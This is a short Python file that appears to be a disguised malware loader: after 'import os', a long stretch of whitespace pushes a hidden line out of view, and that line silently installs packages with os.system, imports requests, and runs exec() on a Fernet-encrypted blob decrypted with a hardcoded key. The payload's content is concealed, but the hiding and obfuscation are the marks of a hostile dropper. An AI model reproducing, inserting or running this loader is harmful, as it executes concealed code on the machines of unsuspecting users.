import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'S90qCuHpjIZJIocULZaLvBNisYn2zviEvsK3gAxhHdQ=').decrypt(b'gAAAAABl-zVJvjiNf9j4M_kvdjJKPw4k1Xc170-bxFe_2f8IQ35RWeqkFbIwHSI891VmUfO-HmiaIpxZjMmE_Qp5aFkPkt1EuqQhV6frwC7z5yxRji90V8J9coxEGbuaVOlNS1ZJGRcm4vF9rvN0VDvOQ9aeAGvOLmh-UTCFrKNtvGL9dCe78GfzxcW46PcikiXwS7JKDWmA'))
